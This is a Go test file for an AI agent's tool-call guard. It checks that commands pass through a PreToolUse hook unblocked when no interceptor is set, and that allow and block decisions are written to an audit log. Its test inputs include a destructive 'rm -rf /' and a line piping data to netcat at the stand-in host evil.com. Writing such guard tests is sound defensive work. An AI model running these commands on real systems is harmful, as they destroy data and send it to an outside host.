package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	commands := []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	}
	for _, cmd := range commands {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// A successful tool call gets exactly one accurate audit entry.
	audit := g.Audit()
	if len(audit) != len(commands) {
		t.Fatalf("got %d audit entries, want %d", len(audit), len(commands))
	}
	for index, entry := range audit {
		if entry.Tool != "Bash" || entry.Action != "allow" || entry.Command != commands[index] {
			t.Errorf("audit[%d] = %+v, want allow for %q", index, entry, commands[index])
		}
	}
}

// The final decision must replace a premature allow, not append a second row.
// The blocked command is retained for investigation, including shell_send input.
func TestBlockedToolDecisionAudit(t *testing.T) {
	g := New()
	cmd := "echo suspicious-content"
	reason := "platform rule denied"
	g.recordToolDecision("shell_send", cmd, hook.Result{Decision: "block", Message: reason})
	audit := g.Audit()
	if len(audit) != 1 {
		t.Fatalf("got %d audit entries, want one", len(audit))
	}
	if got := audit[0]; got.Action != "block" || got.Tool != "shell_send" || got.Command != cmd || got.Reason != reason {
		t.Fatalf("incorrect blocked audit: %+v", got)
	}
}

var _ = hook.PreToolUse
